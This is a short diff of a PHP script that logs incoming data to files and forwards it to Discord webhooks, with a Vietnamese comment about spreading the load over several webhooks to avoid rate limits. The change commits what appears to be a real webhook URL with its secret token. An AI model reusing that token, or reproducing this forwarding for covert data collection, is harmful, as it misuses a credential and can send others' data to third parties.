@@ -27,7 +27,7 @@ file_put_contents($logDir . '/' . $line, json_encode($data, JSON_PRETTY_PRINT | 
 
 // forward webhook — nhiều webhook để chống rate limit
 $webhooks = [
-  'https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN',
+  'https://discord.com/api/webhooks/1568610122794664119/uEuSKJfGpF96kMblYpnjVVYyTBYL6DuWafptMyxuITU_Ep0Lfq94AQWXv6QLxsXoVBKe',
   // 'https://discord.com/api/webhooks/BACKUP_ID/BACKUP_TOKEN',
 ];
 
